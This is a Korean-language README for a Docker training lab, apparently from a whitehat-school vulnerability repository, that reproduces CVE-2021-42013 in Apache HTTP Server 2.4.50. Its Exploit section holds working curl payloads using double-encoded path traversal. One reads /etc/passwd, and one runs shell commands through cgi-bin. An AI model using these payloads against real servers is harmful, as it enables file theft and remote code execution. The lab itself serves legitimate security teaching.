# Apache HTTP Server 2.4.50(CVE-2021-42013) 취약점 <br> CVE-2021-42013

Apache HTTP 서버 프로젝트는 UNIX, Windows를 포함하여 최신 운영 체제를 위한 오픈 소스 HTTP 서버를 개발하고 유지하는 프로젝트입니다. 

해당 취약점은 CVE-2021-41773 취약점을 불완전하게 수정하여 발생하는 취약점으로, 공격자는 경로 순회 취약점을 이용하여 서버의 파일을 모두 유출시킬 수 있습니다.

취약점은 Apache HTTP Server 2.4.49 및 2.4.50에 영향을 미치며 이전 버전에는 영향을 미치지 않습니다.

참고자료:
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://twitter.com/roman_soft/status/1446252280597078024

## 취약한 환경 구성
Apache HTTP Server 2.4.50을 구성하고 취약점을 테스트 하려면 다음 명령어를 실행하세요.
```bash
docker compose build
docker compose up -d
```
서버가 시작되면 "It works!"를 통해 Apache HTTP Server에 대한 기본 페이지를 볼 수 있습니다. **[http://your-ip:8080]**

## Exploit
Apache HTTP Server 2.4.50은 이전 CVE-2021-41773 페이로드를 패치했지만,
http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd를 막는데 성공하였으나 보안 패치는 불완전했습니다.
```bash
curl -v --path-as-is http://your-ip:8080/images/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```
다음과 같은 페이로드를 통해 기존 패치를 우회하고 서버 내 파일을 유출시키는 것이 가능합니다.
이때 images는 임의의 디렉토리입니다.
<img width="997" alt="image" src="https://github.com/one3147/whitehat-school-vulhub/assets/103029974/ab4a36c4-2389-4656-8245-50a1e2e84519">

서버에서 모드 cgi 또는 cgid를 활성화하면 이 경로 순회 취약점으로 인해 임의의 명령 실행이 허용됩니다.
```bash
curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```
<img width="488" alt="image" src="https://github.com/one3147/whitehat-school-vulhub/assets/103029974/27558ae5-d6bc-4b70-8de0-ecb3b2aeb879">
<img width="486" alt="image" src="https://github.com/one3147/whitehat-school-vulhub/assets/103029974/f824d596-ec8b-468e-bbac-374b54da4904">





